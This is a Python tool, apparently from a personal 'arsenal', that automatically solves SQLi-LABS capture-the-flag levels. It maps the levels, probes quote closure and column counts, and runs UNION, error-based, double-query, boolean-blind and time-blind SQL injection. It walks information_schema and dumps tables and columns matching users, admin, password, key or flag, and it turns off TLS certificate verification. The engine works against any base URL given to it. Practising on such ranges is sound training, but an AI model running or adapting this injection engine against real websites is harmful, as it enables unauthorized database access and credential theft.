# -*- coding: utf-8 -*-
"""
SQLi-LABS 专项求解器 — 适配 CTF+ 平台 SQLi-LABS 靶场

功能:
    1. 课程定义 — 75 关完整映射 (Less-1 ~ Less-75)
    2. 自动探测 — 闭合方式/列数/注入类型/数据库指纹
    3. 单关求解 — 自动注入→查库→查表→查列→脱数据
    4. 交互模式 — 手写 SQL 逐关练习
    5. 批量求解 — 一键通全部关卡

靶场地址: http://80-d81dd610-1f3d-45b2-bccd-cf64012932fd.challenge.ctfplus.cn

@author Yang-Web Arsenal v2.2
"""
from __future__ import annotations

import re
import time
import json
import ssl
import urllib.request
import urllib.error
import urllib.parse
from typing import Dict, List, Optional, Tuple, Callable
from dataclasses import dataclass, field


# ═══════════════════════════════════════════════════════════
#  靶场配置
# ═══════════════════════════════════════════════════════════

DEFAULT_BASE_URL = "http://80-d81dd610-1f3d-45b2-bccd-cf64012932fd.challenge.ctfplus.cn"


# ═══════════════════════════════════════════════════════════
#  课程定义: Less-N → 注入类型/手法/难度
# ═══════════════════════════════════════════════════════════

@dataclass
class LessonDef:
    """SQLi-LABS 关卡定义."""
    num: int
    title: str
    page: int          # 1=Basic, 2=Advanced, 3=Stacked, 4=Challenges
    method: str        # GET / POST / COOKIE / HEADER
    param: str         # 注入参数名
    injection_type: str  # error / boolean_blind / time_blind / union / stacked / outfile / update
    quote_type: str    # single / double / none / single_paren / double_paren / addslashes
    difficulty: int    # 1-5
    notes: str = ""


# ── Page 1: Basic Challenges (Less-1 ~ Less-22) ──
LESSON_DB: Dict[int, LessonDef] = {
    1:  LessonDef(1,  "Error Based - String",                1, "GET",  "id", "error",        "single",         1, "单引号闭合，报错回显"),
    2:  LessonDef(2,  "Error Based - Integer",               1, "GET",  "id", "error",        "none",           1, "数字型，无需闭合"),
    3:  LessonDef(3,  "Error Based - String (with Twist)",   1, "GET",  "id", "error",        "single_paren",   1, "单引号+括号 'id')"),
    4:  LessonDef(4,  "Error Based - Double Quotes",         1, "GET",  "id", "error",        "double",         1, '双引号闭合 "id"'),
    5:  LessonDef(5,  "Double Query - Single Quotes",        1, "GET",  "id", "double_query", "single",         2, "双查询报错注入，无直接回显"),
    6:  LessonDef(6,  "Double Query - Double Quotes",        1, "GET",  "id", "double_query", "double",         2, "双查询报错，双引号"),
    7:  LessonDef(7,  "Dump into Outfile",                   1, "GET",  "id", "outfile",      "single_paren",   2, "写入文件，需有写权限"),
    8:  LessonDef(8,  "Blind - Boolean Based - Single",      1, "GET",  "id", "boolean_blind","single",          2, "布尔盲注，单引号"),
    9:  LessonDef(9,  "Blind - Time Based - Single",         1, "GET",  "id", "time_blind",   "single",          2, "时间盲注 sleep()"),
    10: LessonDef(10, "Blind - Time Based - Double",         1, "GET",  "id", "time_blind",   "double",          2, "时间盲注，双引号"),
    11: LessonDef(11, "POST - Error Based - String",         1, "POST", "uname", "error",     "single",          1, "POST 登录框注入"),
    12: LessonDef(12, "POST - Error Based - Double",         1, "POST", "uname", "error",     "double_paren",    1, "POST 双引号+括号"),
    13: LessonDef(13, "POST - Double Injection - String",    1, "POST", "uname", "double_query","single",         2, "POST 双查询"),
    14: LessonDef(14, "POST - Double Injection - Double",    1, "POST", "uname", "double_query","double",         2, ""),
    15: LessonDef(15, "POST - Blind Boolean - String",       1, "POST", "uname", "boolean_blind","single",       2, ""),
    16: LessonDef(16, "POST - Blind Time - Double",          1, "POST", "uname", "time_blind",  "double_paren",  2, ""),
    17: LessonDef(17, "UPDATE - Error Based - String",       1, "POST", "uname", "update",     "single",          3, "UPDATE 注入，密码重置"),
    18: LessonDef(18, "Header - User-Agent - Error",         1, "HEADER","User-Agent","error", "single",          2, "UA 头注入"),
    19: LessonDef(19, "Header - Referer - Error",            1, "HEADER","Referer",  "error",  "single",          2, "Referer 头注入"),
    20: LessonDef(20, "Header - Cookie - Error",             1, "HEADER","Cookie",   "error",  "single",          2, "Cookie 注入"),
    21: LessonDef(21, "Cookie - Error Based - Complex",      1, "COOKIE","uname",   "error",  "single_paren",    3, "Cookie base64 编码"),
    22: LessonDef(22, "Cookie - Error Based - Double",       1, "COOKIE","uname",   "error",  "double",          3, "Cookie 双引号 base64"),

    # ── Page 2: Advanced Injections (Less-23 ~ Less-38) ──
    23: LessonDef(23, "Error Based - No Comments",           2, "GET",  "id", "error",        "single",         3, "过滤注释符 -- #"),
    24: LessonDef(24, "Second Order Injections",             2, "POST", "login", "second_order","single",        4, "二次注入"),
    25: LessonDef(25, "Trick with OR & AND",                 2, "GET",  "id", "error",       "single",          3, "过滤 OR 和 AND"),
    26: LessonDef(26, "Trick with Spaces & Comments",        2, "GET",  "id", "error",       "single",          3, "过滤空格和注释"),
    27: LessonDef(27, "Trick with SELECT & UNION",           2, "GET",  "id", "error",       "single",          3, "过滤 SELECT/UNION"),
    28: LessonDef(28, "Trick with SELECT & UNION (2)",       2, "GET",  "id", "error",       "single_paren",    3, "过滤+括号闭合"),
    29: LessonDef(29, "Protection with WAF",                 2, "GET",  "id", "error",       "single",          4, "WAF 过滤"),
    30: LessonDef(30, "WAF - Double Quotes",                 2, "GET",  "id", "error",       "double",          4, ""),
    31: LessonDef(31, "FUN with WAF",                        2, "GET",  "id", "error",       "double_paren",    4, "WAF 进阶"),
    32: LessonDef(32, "Bypass addslashes()",                 2, "GET",  "id", "error",       "addslashes",      3, "宽字节注入 GBK"),
    33: LessonDef(33, "Bypass addslashes() - GET",           2, "GET",  "id", "error",       "addslashes",      3, ""),
    34: LessonDef(34, "Bypass addslashes() - POST",          2, "POST", "uname","error",     "addslashes",      3, ""),
    35: LessonDef(35, "Why care for addslashes()",           2, "GET",  "id", "error",       "single",          3, "数字型绕过 addslashes"),
    36: LessonDef(36, "MySQL_real_escape_string - GET",      2, "GET",  "id", "error",       "single",          3, "绕过 mysql_real_escape_string"),
    37: LessonDef(37, "MySQL_real_escape_string - POST",     2, "POST", "uname","error",     "single",          3, ""),
    38: LessonDef(38, "Stacked Query - String",              3, "GET",  "id", "stacked",     "single",          2, "堆叠注入"),

    # ── Page 3: Stacked Injections (Less-39 ~ Less-53) ──
    39: LessonDef(39, "Stacked Query - Integer",             3, "GET",  "id", "stacked",     "none",            2, ""),
    40: LessonDef(40, "Stacked Query - Blind - String",      3, "GET",  "id", "stacked",     "single_paren",    3, ""),
    41: LessonDef(41, "Stacked Query - Blind - Integer",     3, "GET",  "id", "stacked",     "none",            3, ""),
    42: LessonDef(42, "Stacked Query - POST - Error",        3, "POST", "login_user","stacked","single",        2, ""),
    43: LessonDef(43, "Stacked Query - POST - String",       3, "POST", "login_user","stacked","single_paren",   2, ""),
    44: LessonDef(44, "Stacked Query - POST - Blind",        3, "POST", "login_user","stacked","single",         3, ""),
    45: LessonDef(45, "Stacked Query - POST - Blind Twist",  3, "POST", "login_user","stacked","single_paren",   3, ""),
    46: LessonDef(46, "ORDER BY Clause - Error - Numeric",   3, "GET",  "sort", "order_by",    "none",           2, "ORDER BY 注入"),
    47: LessonDef(47, "ORDER BY Clause - Error - Single",    3, "GET",  "sort", "order_by",    "single",         2, ""),
    48: LessonDef(48, "ORDER BY Clause - Blind - Numeric",   3, "GET",  "sort", "order_by",    "none",           3, ""),
    49: LessonDef(49, "ORDER BY Clause - Blind - String",    3, "GET",  "sort", "order_by",    "single",         3, ""),
    50: LessonDef(50, "ORDER BY Clause - Stacked",           3, "GET",  "sort", "order_by",    "none",           3, ""),
    51: LessonDef(51, "ORDER BY Clause - Stacked - Single",  3, "GET",  "sort", "order_by",    "single",         3, ""),
    52: LessonDef(52, "ORDER BY Clause - Stacked - Blind",   3, "GET",  "sort", "order_by",    "none",           4, ""),
    53: LessonDef(53, "ORDER BY Clause - Stacked Blind",     3, "GET",  "sort", "order_by",    "single",         4, ""),

    # ── Page 4: Challenges (Less-54 ~ Less-65+) ──
    54: LessonDef(54, "Challenge-1 (Error, 10 tries)",       4, "GET",  "id", "challenge",   "single",          2, "限10次尝试，secret key刷新"),
    55: LessonDef(55, "Challenge-2 (Error, 14 tries)",       4, "GET",  "id", "challenge",   "single_paren",    2, "限14次"),
    56: LessonDef(56, "Challenge-3 (Error, 14 tries)",       4, "GET",  "id", "challenge",   "single_paren",    2, ""),
    57: LessonDef(57, "Challenge-4 (Error, 14 tries)",       4, "GET",  "id", "challenge",   "double",          2, ""),
    58: LessonDef(58, "Challenge-5 (Error, 5 tries)",        4, "GET",  "id", "challenge",   "single",          3, "仅5次尝试"),
    59: LessonDef(59, "Challenge-6 (Error, 5 tries)",        4, "GET",  "id", "challenge",   "none",            3, ""),
    60: LessonDef(60, "Challenge-7 (Error, 5 tries)",        4, "GET",  "id", "challenge",   "double_paren",    3, ""),
    61: LessonDef(61, "Challenge-8 (Error, 5 tries)",        4, "GET",  "id", "challenge",   "single_paren",    3, ""),
    62: LessonDef(62, "Challenge-9 (Blind, 130 tries)",      4, "GET",  "id", "challenge",   "single_paren",    3, "布尔盲注 130次"),
    63: LessonDef(63, "Challenge-10 (Blind, 130 tries)",     4, "GET",  "id", "challenge",   "single",          3, ""),
    64: LessonDef(64, "Challenge-11 (Blind, 130 tries)",     4, "GET",  "id", "challenge",   "double_paren",    3, ""),
    65: LessonDef(65, "Challenge-12 (Blind, 130 tries)",     4, "GET",  "id", "challenge",   "single_paren",    3, ""),
}


# ═══════════════════════════════════════════════════════════
#  闭合映射
# ═══════════════════════════════════════════════════════════

QUOTE_PROBES = [
    ("single",       "'",  "'"),
    ("double",       '"',  '"'),
    ("single_paren", "')", "('"),
    ("double_paren", '")', '("'),
    ("none",         "",   ""),
]

QUOTE_SUFFIX = {
    "single":       "'",
    "double":       '"',
    "single_paren": "')",
    "double_paren": '")',
    "none":         "",
    "addslashes":   "'",   # GBK 宽字节绕过
}


# ═══════════════════════════════════════════════════════════
#  核心求解引擎
# ═══════════════════════════════════════════════════════════

class SQLLabsEngine:
    """SQLi-LABS 自动求解引擎."""

    def __init__(self, base_url: str = DEFAULT_BASE_URL, verbose: bool = True):
        self.base_url = base_url.rstrip("/")
        self.verbose = verbose
        self._ssl_ctx = ssl.create_default_context()
        self._ssl_ctx.check_hostname = False
        self._ssl_ctx.verify_mode = ssl.CERT_NONE
        # XPATH 错误提取正则（兼容截断/完整两种格式）
        # 完整: XPATH syntax error: '~data~'
        # 截断: XPATH syntax error: '~data
        self._xpath_re = re.compile(r"XPATH syntax error:\s*'~([^']+)'?", re.DOTALL)

    # ── HTTP 请求 ──
    def _req(self, path: str, method: str = "GET", data: dict = None,
             headers: dict = None, cookies: dict = None) -> Tuple[int, str]:
        """发送 HTTP 请求，返回 (状态码, 响应体).
        
        path 在拼接前已经过 URL 编码处理。
        """
        # 分离 path 和 query string
        if '?' in path:
            base_path, query = path.split('?', 1)
            # 对 query string 中的空格等特殊字符做 URL 编码
            # 保留已编码的 %xx，只编码未编码的特殊字符
            encoded_query = urllib.parse.quote(query, safe='=&%')
            path = f"{base_path}?{encoded_query}"
        url = f"{self.base_url}{path}"
        try:
            req = urllib.request.Request(url)

            if headers:
                for k, v in headers.items():
                    req.add_header(k, v)

            if cookies and "Cookie" not in (headers or {}):
                cookie_str = "; ".join(f"{k}={v}" for k, v in cookies.items())
                req.add_header("Cookie", cookie_str)

            if method == "POST" and data:
                encoded = urllib.parse.urlencode(data).encode()
                req.data = encoded
                req.add_header("Content-Type", "application/x-www-form-urlencoded")

            with urllib.request.urlopen(req, timeout=10, context=self._ssl_ctx) as resp:
                body = resp.read().decode("utf-8", errors="replace")
                return resp.status, body
        except urllib.error.HTTPError as e:
            body = e.read().decode("utf-8", errors="replace")
            return e.code, body
        except Exception as e:
            if self.verbose:
                print(f"  [REQ ERR] {path}: {e}")
            return 0, ""

    def _get(self, path: str) -> Tuple[int, str]:
        return self._req(path, "GET")

    def _post(self, path: str, data: dict = None) -> Tuple[int, str]:
        return self._req(path, "POST", data=data)

    # ── 日志 ──
    def _log(self, msg: str, level: str = "info"):
        if not self.verbose:
            return
        prefix = {"info": "  [*]", "ok": "  [+]", "err": "  [-]", "warn": "  [!]", "data": "  [→]"}.get(level, "  [*]")
        print(f"{prefix} {msg}")

    # ── 基础探测 ──
    def detect_lesson(self, num: int) -> Optional[LessonDef]:
        """探测关卡是否存在，返回课程定义."""
        path = f"/Less-{num}/"
        code, body = self._get(path)
        if code == 200:
            lesson = LESSON_DB.get(num)
            if lesson:
                title_match = re.search(r'<title>(.*?)</title>', body)
                if title_match:
                    self._log(f"Less-{num}: {title_match.group(1)}", "ok")
                return lesson
        return None

    def detect_quote(self, num: int) -> Tuple[str, str, str]:
        """自动探测闭合方式. 返回 (quote_type, 闭合后缀, 开放前缀)."""
        lesson = LESSON_DB.get(num)
        if lesson and lesson.quote_type != "addslashes":
            # 先用已知类型
            qt = lesson.quote_type
            return qt, QUOTE_SUFFIX.get(qt, ""), ""

        path = f"/Less-{num}/?id=1"
        code, normal = self._get(path)

        for qt, close, open_ in QUOTE_PROBES:
            # 注入单引号产生报错 → 知道闭合方式
            test_path = f"/Less-{num}/?id=1{close}"
            if qt == "none":
                test_path = f"/Less-{num}/?id=1"
            code, err_body = self._get(test_path)

            # 检查是否有 SQL 错误
            if re.search(r'SQL syntax|mysql_fetch|unclosed|syntax error|Warning', err_body, re.IGNORECASE):
                if normal != err_body:
                    self._log(f"检测到闭合: {qt} (quote={close})", "ok")
                    return qt, QUOTE_SUFFIX.get(qt, ""), open_

        # 默认返回单引号
        self._log("无法自动检测闭合，尝试单引号", "warn")
        return "single", "'", ""

    def detect_columns(self, num: int, quote_suffix: str) -> int:
        """ORDER BY 探测列数."""
        for cols in range(1, 21):
            path = f"/Less-{num}/?id=1{quote_suffix} ORDER BY {cols}-- "
            code, body = self._get(path)
            if re.search(r'Unknown column|order clause', body, re.IGNORECASE):
                self._log(f"列数: {cols - 1}", "ok")
                return cols - 1
        self._log("未探测到列数，默认3", "warn")
        return 3

    def detect_dbms(self, num: int, quote_suffix: str, cols: int) -> str:
        """探测数据库类型."""
        payloads = [
            ("MySQL",    f"?id=-1{quote_suffix} UNION SELECT 1,@@version,{','.join(['NULL'] * (cols - 2))}-- "),
            ("MySQL",    f"?id=-1{quote_suffix} UNION SELECT 1,version(),{','.join(['NULL'] * (cols - 2))}-- "),
            ("PostgreSQL", f"?id=-1{quote_suffix} UNION SELECT 1,version(),{','.join(['NULL'] * (cols - 2))}-- "),
            ("MSSQL",    f"?id=-1{quote_suffix} UNION SELECT 1,@@version,{','.join(['NULL'] * (cols - 2))}-- "),
        ]
        for dbms, path in payloads:
            code, body = self._get(f"/Less-{num}/{path}")
            # MySQL 版本特征
            if re.search(r'\d+\.\d+\.\d+', body):
                # 检查是否是真实注入结果（非 Less-1 等固定输出）
                if "Your Login name" not in body or re.search(r'\d+\.\d+\.\d+-', body):
                    return dbms
        return "MySQL"  # SQLi-LABS 默认 MySQL

    # ── 核心注入 ──
    def union_inject(self, num: int, quote_suffix: str, query: str, cols: int = 3) -> str:
        """UNION SELECT 注入 — 自动找到回显位."""
        # 先尝试用 concat 把所有列拼在一起
        # 对 3 列：-1' UNION SELECT 1,CONCAT(0x7e,QUERY,0x7e),3--
        # 对 2 列：-1' UNION SELECT 1,CONCAT(0x7e,QUERY,0x7e)--
        concat_cols = []
        for i in range(1, cols + 1):
            if i == 2:
                concat_cols.append(f"CONCAT(0x7e,({query}),0x7e)")
            else:
                concat_cols.append(str(i))
        union_str = ",".join(concat_cols)
        path = f"/Less-{num}/?id=-1{quote_suffix} UNION SELECT {union_str}-- "
        code, body = self._get(path)
        
        # 提取 ~...~ 包裹的内容
        m = self._xpath_re.search(body)
        if m:
            return m.group(1)
        
        # 回退: 尝试不同的回显列位置
        for display_col in range(1, cols + 1):
            cols_list = ["NULL"] * cols
            cols_list[display_col - 1] = f"({query})"
            union_str2 = ",".join(cols_list)
            path2 = f"/Less-{num}/?id=-1{quote_suffix} UNION SELECT {union_str2}-- "
            _, body2 = self._get(path2)
            body_clean = re.sub(r'<[^>]*>', '\n', body2)
            body_clean = re.sub(r'\n\s*\n', '\n', body_clean).strip()
            body_clean = re.sub(r'(?:Welcome|Dhakkan|Your\s*Login|Your\s*Password)[^\n]*', '', body_clean, flags=re.IGNORECASE).strip()
            if body_clean and len(body_clean) > 2:
                return body_clean
        
        return ""

    def error_based_inject(self, num: int, quote_suffix: str, query: str) -> str:
        """报错注入 (extractvalue/updatexml) — 自动处理 32 字符截断."""
        result = ""
        offset = 1
        max_chunks = 10  # 最多取 320 字符
        
        for chunk in range(max_chunks):
            if offset == 1:
                inner = query
            else:
                inner = f"SUBSTRING(({query}),{offset})"
            
            payload = f"-1{quote_suffix} AND extractvalue(1,concat(0x7e,({inner}),0x7e))-- "
            path = f"/Less-{num}/?id={payload}"
            code, body = self._get(path)
            
            m = self._xpath_re.search(body)
            if not m:
                # 尝试 updatexml
                payload2 = f"-1{quote_suffix} AND updatexml(1,concat(0x7e,({inner}),0x7e),1)-- "
                path2 = f"/Less-{num}/?id={payload2}"
                _, body2 = self._get(path2)
                m = self._xpath_re.search(body2)
            
            if m:
                chunk_data = m.group(1).rstrip('~')
                result += chunk_data
                if len(chunk_data) < 30:
                    break  # 完整的最后一块
                offset += len(chunk_data)
            else:
                break
        
        return result

    def boolean_blind_inject(self, num: int, quote_suffix: str, query: str) -> str:
        """布尔盲注 — 逐字符二分法提取数据."""
        result = ""
        for pos in range(1, 65):
            low, high = 32, 126
            found = False
            for _ in range(8):  # 二分查找
                mid = (low + high) // 2
                path = f"/Less-{num}/?id=1{quote_suffix} AND ASCII(SUBSTRING(({query}),{pos},1))>{mid}-- "
                code, body = self._get(path)
                # 检查是否正常回显 (You are in...)
                if "You are in" in body or "Your Login" in body or "Dumb" in body:
                    low = mid + 1
                else:
                    high = mid
                if low > high:
                    break

            if low < 32 or low > 126:
                break
            result += chr(low)
        return result

    def time_blind_inject(self, num: int, quote_suffix: str, query: str) -> str:
        """时间盲注 — SLEEP + 逐字符提取."""
        result = ""
        for pos in range(1, 65):
            found = False
            for ch in range(32, 127):
                path = f"/Less-{num}/?id=1{quote_suffix} AND IF(ASCII(SUBSTRING(({query}),{pos},1))={ch},SLEEP(2),0)-- "
                start = time.time()
                code, body = self._get(path)
                elapsed = time.time() - start
                if elapsed > 1.5:
                    result += chr(ch)
                    found = True
                    self._log(f"盲注进度: {result}", "data")
                    break
            if not found:
                break
        return result

    def double_query_inject(self, num: int, quote_suffix: str, query: str) -> str:
        """双查询报错注入 — 使用 AND 子查询（不依赖 UNION）."""
        # 方法1: AND 子查询 - 适合 WAF 阻断 UNION 的环境
        payload = (f"-1{quote_suffix} AND (SELECT 1 FROM "
                   f"(SELECT COUNT(*),CONCAT(({query}),0x3a,FLOOR(RAND()*2))x "
                   f"FROM information_schema.tables GROUP BY x)a)-- ")
        path = f"/Less-{num}/?id={payload}"
        code, body = self._get(path)
        m = re.search(r"Duplicate entry '([^:']+?):1'", body)
        if m:
            return m.group(1)
        
        # 方法2: GROUP BY 派生表
        payload2 = (f"-1{quote_suffix} UNION SELECT 1,count(*),"
                    f"CONCAT(({query}),0x3a,FLOOR(RAND()*2))a "
                    f"FROM information_schema.tables GROUP BY a-- ")
        path2 = f"/Less-{num}/?id={payload2}"
        _, body2 = self._get(path2)
        m2 = re.search(r"Duplicate entry '([^:']+?)", body2)
        if m2:
            return m2.group(1)
        
        return ""

    # ── 数据提取流程 ──
    def extract_data(self, num: int, quote_suffix: str, injection_type: str) -> dict:
        """完整数据提取: 库→表→列→数据."""
        result = {"database": "", "tables": [], "columns": {}, "data": {}, "flag": ""}

        # 选择注入函数 — 级联回退策略
        cols = self.detect_columns(num, quote_suffix)
        
        if injection_type in ("boolean_blind", "time_blind"):
            # 盲注：先用快速方法试一下，不行再用慢速盲注
            if injection_type == "boolean_blind":
                inject_fn = lambda q: self.boolean_blind_inject(num, quote_suffix, q)
            else:
                inject_fn = lambda q: self.time_blind_inject(num, quote_suffix, q)
        else:
            # 有回显型注入：级联尝试 error_based → double_query → union
            def cascade_inject(q):
                """级联尝试多种注入方法."""
                # 1. 报错注入（最稳定，extractvalue/updatexml）
                r = self.error_based_inject(num, quote_suffix, q)
                if r:
                    return r
                # 2. 双查询注入
                r = self.double_query_inject(num, quote_suffix, q)
                if r:
                    return r
                # 3. UNION 注入（部分靶场有 WAF 阻断）
                r = self.union_inject(num, quote_suffix, q, cols)
                if r:
                    return r
                return ""
            inject_fn = cascade_inject

        try:
            # 1. 数据库名
            self._log("提取数据库名...", "info")
            db = inject_fn("database()")
            # 清理 HTML
            db = re.sub(r'<[^>]*>', '', db).strip()
            result["database"] = db
            self._log(f"数据库: {db}", "ok")

            if not db:
                self._log("无法获取数据库名", "err")
                return result

            # 2. 表名
            self._log("提取表名...", "info")
            tables = inject_fn(
                f"SELECT GROUP_CONCAT(table_name) FROM information_schema.tables "
                f"WHERE table_schema='{db}'"
            )
            tables_clean = re.sub(r'<[^>]*>', '', tables).strip()
            # 查找 flag / secret / users 表
            table_list = tables_clean.split(",") if tables_clean else []
            result["tables"] = table_list
            self._log(f"表: {', '.join(table_list[:10])}" + ("..." if len(table_list) > 10 else ""), "ok")

            # 找重点表
            target_tables = [t for t in table_list if
                           re.search(r'flag|secret|users?|admin|key|passw', t, re.IGNORECASE)]
            if not target_tables:
                target_tables = table_list[:2]  # 取前两个

            # 3. 逐表提取列和数据
            for tbl in target_tables[:3]:  # 最多3张表
                self._log(f"提取列名 - {tbl}...", "info")
                cols_str = inject_fn(
                    f"SELECT GROUP_CONCAT(column_name) FROM information_schema.columns "
                    f"WHERE table_name='{tbl}' AND table_schema='{db}'"
                )
                cols_clean = re.sub(r'<[^>]*>', '', cols_str).strip()
                col_list = cols_clean.split(",") if cols_clean else []
                result["columns"][tbl] = col_list
                self._log(f"  列: {', '.join(col_list)}", "data")

                # 查找 flag 列
                flag_cols = [c for c in col_list if re.search(r'flag|secret|key|passw', c, re.IGNORECASE)]
                if not flag_cols:
                    flag_cols = col_list[:2]

                # 4. 提取数据
                for fc in flag_cols[:2]:
                    data_vals = inject_fn(
                        f"SELECT GROUP_CONCAT({fc} SEPARATOR ' | ') FROM {db}.{tbl} LIMIT 10"
                    )
                    data_clean = re.sub(r'<[^>]*>', '', data_vals).strip()
                    result["data"][f"{tbl}.{fc}"] = data_clean
                    self._log(f"  {tbl}.{fc}: {data_clean[:80]}", "data")

                    # 检查 flag
                    flag_match = re.search(r'(?:flag|ctf|iscc|sctf)\{[^}]+\}', data_clean, re.IGNORECASE)
                    if flag_match:
                        result["flag"] = flag_match.group(0)
                        self._log(f"🎉 Flag: {result['flag']}", "ok")

        except Exception as e:
            self._log(f"提取异常: {e}", "err")

        return result

    # ── 单关求解入口 ──
    def solve_lesson(self, num: int) -> dict:
        """求解单个关卡，返回完整解题报告."""
        self._log(f"=" * 50)
        self._log(f"解题: Less-{num}", "ok")

        lesson = self.detect_lesson(num)
        if not lesson:
            self._log(f"Less-{num} 不存在", "err")
            return {"success": False, "error": "Lesson not found"}

        # 探测闭合
        quote_type, quote_suffix, _ = self.detect_quote(num)
        injection_type = lesson.injection_type

        # 对于 POST 型，不做太复杂的自动 POST 注入探测
        # 专注于 GET 型自动求解
        result = {
            "lesson": num,
            "title": lesson.title,
            "quote_type": quote_type,
            "injection_type": injection_type,
            "success": False,
            "flag": "",
            "database": "",
            "tables": [],
            "data": {},
        }

        try:
            data = self.extract_data(num, quote_suffix, injection_type)
            result.update(data)
            result["success"] = bool(data.get("database") or data.get("flag"))
        except Exception as e:
            result["error"] = str(e)
            self._log(f"求解失败: {e}", "err")

        return result

    # ── 批量求解 ──
    def solve_all(self, start: int = 1, end: int = 65, skip: List[int] = None) -> List[dict]:
        """批量求解关卡范围."""
        skip = skip or []
        results = []
        total = sum(1 for n in range(start, end + 1) if n not in skip)
        solved = 0

        self._log(f"批量求解: Less-{start} ~ Less-{end} (跳过: {skip})", "info")
        self._log(f"共 {total} 关", "info")

        for num in range(start, end + 1):
            if num in skip:
                continue
            if num not in LESSON_DB:
                continue
            try:
                r = self.solve_lesson(num)
                results.append(r)
                if r["success"]:
                    solved += 1
                # 避免请求过快
                time.sleep(0.3)
            except Exception as e:
                self._log(f"Less-{num} 异常: {e}", "err")
                results.append({"lesson": num, "success": False, "error": str(e)})

        self._log(f"=" * 50)
        self._log(f"完成: {solved}/{len(results)} 关成功", "ok" if solved > 0 else "warn")

        # 汇总 flag
        flags = [r["flag"] for r in results if r.get("flag")]
        if flags:
            self._log(f"Flags: {', '.join(flags)}", "ok")

        return results


# ═══════════════════════════════════════════════════════════
#  交互式 CLI
# ═══════════════════════════════════════════════════════════

class SQLLabsCLI:
    """SQLi-LABS 交互式命令行."""

    def __init__(self, base_url: str = DEFAULT_BASE_URL):
        self.engine = SQLLabsEngine(base_url, verbose=True)

    def interactive(self):
        """交互模式."""
        print("=" * 60)
        print("  SQLi-LABS 交互式求解器")
        print(f"  靶场: {self.engine.base_url}")
        print("=" * 60)
        print("  命令: solve N | batch [start] [end] | list | info N | quit")
        print()

        while True:
            try:
                cmd = input("sqli> ").strip()
                if not cmd:
                    continue

                parts = cmd.split()
                action = parts[0].lower()

                if action == "quit" or action == "exit":
                    break
                elif action == "list":
                    self._list_lessons()
                elif action == "info" and len(parts) > 1:
                    self._info(int(parts[1]))
                elif action == "solve" and len(parts) > 1:
                    num = int(parts[1])
                    r = self.engine.solve_lesson(num)
                    self._print_result(r)
                elif action == "batch":
                    start = int(parts[1]) if len(parts) > 1 else 1
                    end = int(parts[2]) if len(parts) > 2 else 65
                    results = self.engine.solve_all(start, end)
                    self._print_summary(results)
                else:
                    print(f"  未知命令: {cmd}")
                    print("  可用: list | info N | solve N | batch [start] [end] | quit")
            except (KeyboardInterrupt, EOFError):
                break
            except Exception as e:
                print(f"  错误: {e}")

    def _list_lessons(self):
        print(f"\n{'ID':>4}  {'类型':<16} {'方法':<6} {'难度':<5} 标题")
        print("-" * 70)
        for num, l in sorted(LESSON_DB.items()):
            diff = "⭐" * l.difficulty
            print(f"{num:>4}  {l.injection_type:<16} {l.method:<6} {diff:<6} {l.title}")

    def _info(self, num: int):
        l = LESSON_DB.get(num)
        if not l:
            print(f"  Less-{num} 未定义")
            return
        print(f"\n  Less-{num}: {l.title}")
        print(f"  Page: {l.page} | Method: {l.method} | Param: {l.param}")
        print(f"  Injection: {l.injection_type} | Quote: {l.quote_type} | Difficulty: {'⭐'*l.difficulty}")
        print(f"  Notes: {l.notes}")

    def _print_result(self, r: dict):
        print(f"\n  Lesson: Less-{r.get('lesson')}")
        print(f"  Title: {r.get('title')}")
        print(f"  Success: {'✅' if r.get('success') else '❌'}")
        if r.get("flag"):
            print(f"  🏁 Flag: {r['flag']}")
        if r.get("database"):
            print(f"  📦 DB: {r['database']}")
        if r.get("data"):
            for k, v in r["data"].items():
                print(f"  📊 {k}: {v[:100]}")
        if r.get("error"):
            print(f"  ⚠️ Error: {r['error']}")
        print()

    def _print_summary(self, results: list):
        solved = sum(1 for r in results if r.get("success"))
        flags = [r["flag"] for r in results if r.get("flag")]
        print(f"\n  总结: {solved}/{len(results)} 成功")
        if flags:
            print(f"  Flags: {', '.join(flags)}")
        print()


# ═══════════════════════════════════════════════════════════
#  GUI 接口
# ═══════════════════════════════════════════════════════════

def solve_sqli_labs(
    lesson: int = None,
    start: int = 1,
    end: int = 65,
    base_url: str = DEFAULT_BASE_URL,
    callback: Callable = None,
) -> dict:
    """GUI 调用的统一接口.

    Args:
        lesson: 单关编号 (None = 批量)
        start/end: 批量范围
        base_url: 靶场URL
        callback: 进度回调 fn(msg, progress_pct)

    Returns:
        {"success": bool, "results": [...], "flags": [...]}
    """
    engine = SQLLabsEngine(base_url, verbose=False)

    if lesson:
        if callback:
            callback(f"正在求解 Less-{lesson}...", 10)
        r = engine.solve_lesson(lesson)
        if callback:
            callback(f"Less-{lesson} 完成: {'✅' if r['success'] else '❌'}", 100)
        return {"success": r["success"], "results": [r], "flags": [r.get("flag")] if r.get("flag") else []}

    # 批量
    results = []
    total_lessons = [n for n in range(start, end + 1) if n in LESSON_DB]
    for i, num in enumerate(total_lessons):
        if callback:
            pct = int((i / len(total_lessons)) * 100)
            callback(f"Less-{num} ({i+1}/{len(total_lessons)})...", pct)
        try:
            r = engine.solve_lesson(num)
            results.append(r)
        except Exception as e:
            results.append({"lesson": num, "success": False, "error": str(e)})
        time.sleep(0.2)

    solved = sum(1 for r in results if r.get("success"))
    flags = [r.get("flag") for r in results if r.get("flag")]
    if callback:
        callback(f"批量完成: {solved}/{len(results)} 成功", 100)

    return {"success": solved > 0, "results": results, "flags": flags, "solved": solved, "total": len(results)}


# ═══════════════════════════════════════════════════════════
#  独立运行
# ═══════════════════════════════════════════════════════════

if __name__ == "__main__":
    import sys
    if len(sys.argv) > 1:
        # 命令行模式: python sqli_labs_solver.py solve 1
        # 或: python sqli_labs_solver.py batch 1 10
        # 或: python sqli_labs_solver.py interactive
        cmd = sys.argv[1]
        cli = SQLLabsCLI()
        if cmd == "interactive":
            cli.interactive()
        elif cmd == "solve" and len(sys.argv) > 2:
            num = int(sys.argv[2])
            r = cli.engine.solve_lesson(num)
            cli._print_result(r)
        elif cmd == "batch":
            start = int(sys.argv[2]) if len(sys.argv) > 2 else 1
            end = int(sys.argv[3]) if len(sys.argv) > 3 else 65
            results = cli.engine.solve_all(start, end)
            cli._print_summary(results)
        elif cmd == "list":
            cli._list_lessons()
        elif cmd == "info" and len(sys.argv) > 2:
            cli._info(int(sys.argv[2]))
        else:
            print("用法: python sqli_labs_solver.py [interactive|solve N|batch S E|list|info N]")
    else:
        # 默认交互模式
        cli = SQLLabsCLI()
        cli.interactive()
